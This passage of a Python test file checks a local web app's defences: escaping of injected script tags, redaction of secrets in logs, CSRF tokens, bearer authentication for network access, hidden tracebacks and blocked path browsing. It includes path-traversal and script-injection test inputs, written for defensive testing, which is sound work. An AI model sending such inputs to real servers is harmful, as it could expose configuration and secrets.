    logs = client.get(f"/runs/{run_id}/logs").text
    assert "<script>alert" not in home
    assert "&lt;script&gt;" in home
    assert "super-secret" not in logs
    assert "runtime-secret" not in logs
    assert "[redacted]" in logs
    assert str(context.project_root) not in logs


def test_csrf_is_required_for_mutating_routes(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context)
    app = create_app(context)
    client = TestClient(app)
    denied = client.post(f"/runs/{run_id}/actions/pause")
    assert denied.status_code == 403
    allowed = client.post(
        f"/runs/{run_id}/actions/pause",
        headers={"X-CSRF-Token": app.state.spritelab_csrf_token},
    )
    assert allowed.status_code == 409


def test_non_loopback_requires_authentication_and_shows_warning(tmp_path: Path) -> None:
    context = _context(tmp_path)
    settings = WebServerSettings(
        host="0.0.0.0",
        allow_non_loopback=True,
        authentication_token="runtime-only-token",
    )
    client = TestClient(create_app(context, settings=settings))
    denied = client.get("/", follow_redirects=False)
    assert denied.status_code == 303
    assert denied.headers["location"] == "/auth"
    api_denied = client.get("/api/current-run")
    assert api_denied.status_code == 401
    allowed = client.get("/", headers={"Authorization": "Bearer runtime-only-token"})
    assert allowed.status_code == 200
    assert "Network access is enabled." in allowed.text
    assert "runtime-only-token" not in allowed.text


def test_unexpected_errors_hide_tracebacks_and_preserve_safe_reference(tmp_path: Path) -> None:
    context = _context(tmp_path)

    def router_factory(_context: ProjectContext) -> APIRouter:
        router = APIRouter()

        @router.get("/explode")
        async def explode() -> None:
            raise RuntimeError("private traceback detail")

        return router

    plugin = ProductPlugin(
        plugin_id="playground.explode",
        title="Playground",
        cli_registration=lambda _registry: None,
        status_provider=lambda _context: _result(),
        capability_probe=lambda _context: (),
        web_router_factory=router_factory,
        navigation=(WebNavigationItem("playground", "Playground", "/explode"),),
    )
    response = TestClient(create_app(context, plugins=[plugin]), raise_server_exceptions=False).get("/explode")
    assert response.status_code == 500
    assert "Something went wrong" in response.text
    assert "Your completed work was preserved when possible." in response.text
    assert "ERR-" in response.text
    assert "Traceback" not in response.text
    assert "private traceback detail" not in response.text


def test_windows_paths_are_not_browsable_and_artifact_names_are_portable(tmp_path: Path) -> None:
    context = _context(tmp_path)
    run_id, _events = _write_run(context)
    repository = EventRepository(context.runs_directory)
    assert repository.snapshot(run_id).artifacts == ["checkpoint.safetensors"]
    client = TestClient(create_app(context))
    assert client.get("/runs/../spritelab.yaml").status_code == 404
    assert client.get(r"/runs/C:\example").status_code == 404
